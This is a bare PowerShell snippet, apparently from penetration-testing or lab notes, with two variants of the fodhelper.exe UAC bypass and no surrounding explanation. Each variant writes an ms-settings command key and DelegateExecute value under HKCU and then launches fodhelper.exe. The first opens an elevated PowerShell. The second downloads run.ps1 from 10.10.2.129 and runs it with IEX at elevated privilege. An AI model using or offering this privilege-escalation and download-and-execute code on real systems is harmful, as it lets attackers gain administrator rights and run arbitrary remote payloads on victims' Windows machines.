```powershell
New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value powershell.exe -Force
New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force
C:\\Windows\\System32\\fodhelper.exe
```

```powershell
New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://10.10.2.129/run.ps1') | IEX" -Force
New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force
C:\\Windows\\System32\\fodhelper.exe
```
